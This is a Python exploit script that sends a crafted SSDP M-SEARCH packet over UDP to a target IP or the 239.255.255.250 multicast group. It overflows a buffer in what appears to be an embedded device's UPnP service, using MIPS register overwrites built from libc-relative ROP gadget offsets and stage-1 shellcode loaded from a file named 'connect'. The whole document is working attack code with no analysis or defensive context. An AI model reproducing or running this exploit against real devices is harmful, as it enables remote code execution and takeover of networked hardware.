import socket
import random
import socket
import hexdump

from struct import *
from binascii import hexlify,unhexlify
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--intf', help='interface to send packet ex: eth0',required=True)
parser.add_argument('--tip', help='target ip , you can send to all on 239.255.255.250',required=True)
parser.add_argument('--tport', help='target ip ',required=True)
parser.add_argument('--libcaddr', help='libc base start address ex:',required=True)

args = parser.parse_args()
intf = args.intf
tip = args.tip
tport = args.tport
libcaddr = args.libcaddr

BSIZE = 0x1b0
rdstr = bytearray('\x41'*BSIZE)


print '[*] using libc base address: ' + libcaddr

rdstr[0xcc:0xd0] = pack(">I",int(libcaddr, 16) + 0x60330) # ra 
rdstr[0xb8:0xbc] = pack(">I",int(libcaddr, 16) + 0x21380) # s0
rdstr[0xc8:0xcc] = pack(">I",int(libcaddr, 16) + 0x5e930) # s4
rdstr[0xc0:0xc4] = pack(">I",int(libcaddr, 16) + 0x5e930) # s2
rdstr[0xf4:0xf8] = pack(">I",int(libcaddr, 16) + 0x39b34) # s1
rdstr[0xec:0xf0] = b'\xFF\xFF\xFF\xFD'
rdstr[0xf0:0xf4] = b'\xFF\xFF\xFF\xFE'
rdstr[0xe8:0xec] = pack(">I",int(libcaddr, 16) + 0x4918c) # dont remember :P 

print '[*] adjusted registers relative offsets: ra:0x' + hexlify(rdstr[0xcc:0xd0])+' s0:0x' + hexlify(rdstr[0xb8:0xbc])+' s4:0x' + hexlify(rdstr[0xc8:0xcc])+' s2:0x' + hexlify(rdstr[0xc0:0xc4])+' s1:0x' + hexlify(rdstr[0xf4:0xf8])+' unkn:0x' + hexlify(rdstr[0xe8:0xec])

print '[*] loading stage1 payload: '
o = open('connect','rb')
data = o.read()
o.close

for x in range(0,len(data)):
    rdstr[0x110+x] = data[x]

print '[*] shellcode mixed and ready: '

MESSAGE =   "M-SEARCH * HTTP/1.1\r\n"\
            "Host:239.255.255.250:1900\r\n"\
            "ST:\"uuid:schemas:device:" + rdstr + ":end\"\r\n"\
            "Man:\"ssdp:discover\"\r\n"\
            "MX:2\r\n\r\n"

print '[*] payload  ready'

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
sock.setsockopt(socket.SOL_SOCKET, 25, intf)
sock.sendto(MESSAGE, (tip, tport))

print '[*] sending payload to target ' + tip + ':' + tport

